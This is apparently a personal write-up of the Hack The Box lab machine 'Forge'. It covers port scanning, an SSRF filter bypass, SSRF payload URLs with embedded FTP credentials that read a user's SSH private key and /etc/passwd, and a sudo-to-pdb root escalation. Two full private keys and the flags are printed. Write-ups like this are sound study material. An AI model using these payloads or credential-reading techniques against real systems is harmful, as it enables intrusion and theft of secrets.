# Forge #


1. Nmap 

Nmap doesn't work with default port, so we add "forge.htb" to /etc/hosts to resolve the domain. After this step, nmap will work correctly :
~~~sql
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 13:41 EDT
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Gallery
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
~~~~

Ftp is filtered, brute forcing ssh is never an option, so we continue towards http : 

![[Pasted image 20211021134420.png]]

We see an upload section, where we can upload from URL. (kinda weird) . Lets see if we can access the contents of the site.
![[Pasted image 20211022134410.png]]

*Input : http:forge.htb*
*Output : URL contains a blacklisted address.*

We need to bypass the filters...

***Try 1 : Base64 - name could not pe resolved error : 

~~~sql# 

**An error occured! Error : HTTPConnectionPool(host='cacat', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5dc7df64f0>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))**

~~~


**Try 2: Abuse lowercase ( http://foRge.Htb )

~~~sql
  

# 

**File uploaded successfully to the following url:**

# 

**[http://forge.htb/uploads/GacyFA3hq1A0p9Zg1mso](http://forge.htb/uploads/GacyFA3hq1A0p9Zg1mso)**

~~~

WORKS!!! Let's curl the data to see what we get : we just get the main body of the html. 
Can't find any valuable restriced addreses yet.. Lets brute force some directories.. Nothing of use..

Start looking for subdomains.. DNS didnt do anything.. <Mark>VHOSTS returned admin.forge.htb!!!!</Mark>

(Needs to be completed with the admin page an announcements..)
Found some interesting info

Payload : http://Admin.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@LoCaLhOsT

Result : Connected to ftp.. Looks like we are in home. (picture needed)

Payload : http://Admin.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@LoCaLhOsT/.ssh/id_rsa

Result:

###RSA KEY###
~~~text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE
7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk
r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D
WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G
mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR
GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD
K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2
EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d
aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2
GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG
K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6
dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y
JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu
MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF
DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r
rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU
xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0
2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98
yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+
kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/
wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu
DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA
wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM
0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf
FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg
NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC
9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P
fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ
dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr
W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL
wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb
RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb
nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
~~~

We dont know the user tho.. so lets just access /etc/passwd.. 

http://Admin.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@LoCaLhOsT//..//..//..//..//..//etc/passwd

Result : 

~~~
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:NoobHacker:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:113:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
~~~

<Mark> NOTE : When going back, paths need to be escaped (it didnt work with one forward slash, even tho it did work when accessing id_rsa.. weird) </Mark>
	
Apparently we didnt even need a name... The name is the same as ftp -> user.
	
We got the user flag..  > 839dd98a5b3f169b205f4b8718952641 

Privesc was straightforward.. 
* sudo -l to find what resources can be accesed with sudo and we find a python script..
~~~python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()

~~~
* we send the "secretadminpassword" string to the random port the socket
will listen to
* we crash the app to enter pdb (Py debugger)
* pdb allows normal python code, thus any sudo RCE with the help of the os library. we can either :
		* cat the root flag
		* get the rsa key and ssh with root
		* spawn a reverse shell with nc, bash or python itself 
	
###ROOT RSA KEY### :
~~~text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/
DdTvY7o7bvSinEX26rWdG4eVY3qnBGSACl3VIGX80NsWgyZwWQT20Vj0q8gf674RB4LfB6
i6Awm8cbm3105HxfQnqr4qr2oJEpyDVaF29zpaS+6y0Ogq7HcRkSyQyErBnGmlOYBcBvvh
M+/j0iCCMfM6ZbZ/0ouoN4uOXzn+jh/ZJstDoEd0VH4RhnMzHA1hdo+6+OhFUbtoCFdxtP
wfzVp0LQb2wqitREeT5GNPIVL2//tbNz+QUfuwQAEHCcveyKWDVTs/klDkcf/p9NqsAspn
re6QhoLqzsuAXds0gThQLN+/+EUuV3sZ6wdkmHBqKbm8aaGc84P/SpnDvz249+G188NoUq
nVSb9RCRnGy/JStP97umzhbyJLiRpRY8Dlh8Ugln6D58b5QVk3uYjP0muf+SI3No+L7+81
iM7jNo9x2Jsg79tjP/RfgSJdTt6atSgeq9BwBJzxAAAFgPqA8Wj6gPFoAAAAB3NzaC1yc2
EAAAGBALrExO7r7wS636gy7+iP/l3PVv0VRgOHhTzqMFDZBw2eDE1JuHCuPw3U72O6O270
opxF9uq1nRuHlWN6pwRkgApd1SBl/NDbFoMmcFkE9tFY9KvIH+u+EQeC3weougMJvHG5t9
dOR8X0J6q+Kq9qCRKcg1Whdvc6WkvustDoKux3EZEskMhKwZxppTmAXAb74TPv49IggjHz
OmW2f9KLqDeLjl85/o4f2SbLQ6BHdFR+EYZzMxwNYXaPuvjoRVG7aAhXcbT8H81adC0G9s
KorURHk+RjTyFS9v/7Wzc/kFH7sEABBwnL3silg1U7P5JQ5HH/6fTarALKZ63ukIaC6s7L
gF3bNIE4UCzfv/hFLld7GesHZJhwaim5vGmhnPOD/0qZw789uPfhtfPDaFKp1Um/UQkZxs
vyUrT/e7ps4W8iS4kaUWPA5YfFIJZ+g+fG+UFZN7mIz9Jrn/kiNzaPi+/vNYjO4zaPcdib
IO/bYz/0X4EiXU7emrUoHqvQcASc8QAAAAMBAAEAAAGAR6rR1sx5/1qmECjbnmYCuYSiYK
MVJq2OFv3WZG+jITqQhefP+o0ibPBUm/QOclk1PLosMYxXKQUx8eZSyIC4EUJIUhJQnOQ1
E0ZgvggFnfeAi5pThWZ9qmAxrQK1vgyyXwFg5iGHsRIrVn16a61Ipfeg/e7jc6LUm2aQ/1
DXh7145DgxpmnpOVfgqtvydEua8w8OYMdQrlIjCnypN+WXOxk2HJxobakS7qv42zwQC4wE
tY7nAdCwoYotuO2IDADZFcRWiPImmTnVWQvM27VKzpuDmp1kmOh8VD1qFV0GlPQIsJMHLH
rQYJ6toBi7WaHC7H56EDd9QrVJgmmj50I90weAj8fldN+L8VSl3PKBgzdsxUH9xB3toj1z
uYvgk7cPxcW78ObYUkmNUJNMZcA0/LezoXG7fWuhRoOf1eXIbUKYd+ygNlyxaqywufESzY
HaGezUEV+UsI0Ll3Me7WyslZaX6hpOjhYJmN3kv0dWNJg9Nkg29Pr4iU5q+t71BYlxAAAA
wFWKwWX2ApTatPB/5GvAs3SWT+O3bj3FXoQ3VjI5D+vPyUCx9Dr/iMOBv5YHObfxwqezzD
0m82Zy1gwvWUPpVq4uiRPwwojqAYqDwA/gbX3+LdVR0bZFMFx2R0FzVXEIMCI5Cxvg+DBx
NsLIQ8EbEWGp9NWOa9FeRsA8o/KjzFEPU8MlxxgaFkzsxciykNGZk1luUSsNujm7fgWv55
ZdFmti8b1TAt5cVkHrT5Fks835XX9W8exqcOcZlEHIXOSgLQAAAMEA9cceY3X6o9Nu6xPu
3eREkMAjIaR+cY/OrKO40Zm0NiIvpi+kOVoNtau0gXSXNryMyuGsjGuWW8IPnpr21UBJP8
1O4kfqXdsfj067n21kofcxS4Ca6cSi7m4HU6ZGGpiC9eSJ44XRNGypKhahpxhbZqgFFdVU
MdzdsZRFhm1tdQU8ZoqouPAX+tI3788IBG2QAgTpQ9ly7sVKMdwfT9qC3wtcgXGS1OweaC
BUDvWd2rzP7/egeGqGWFOYZFxKhndPAAAAwQDCiVwE7LiHyZHfHN7amzdusL9odhljHkYf
2xeZP3PERvqWr3g8xwhgT4oGUy8x3zgILYYvnX04FpfpBMke725nEyrvK/kZf/Sgp7Sk0h
pbEabGDypeS4A3UIhtaM+VShS7wJGz8sXAbMm+JSwMt67vN95IULw6+SuyirRLUDc77N76
xIK6PSiF7Hs2Z7BZOVQd1BpblnZrL3mbJcdvXS8n55QgDuxfJeoxKrr9r1r/WqRjtce8/A
ZPz43Mi1EOl78AAAAKcm9vdEBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
~~~

# Flag : fefaec21f46d943408e6622daeef003b


<< LESSONS LEARNED >>
<Mark> 
	* Check for VHOSTS subdomains, not only DNS (this was the hardest part of the whole box) *
	* More notes to come*
</Mark>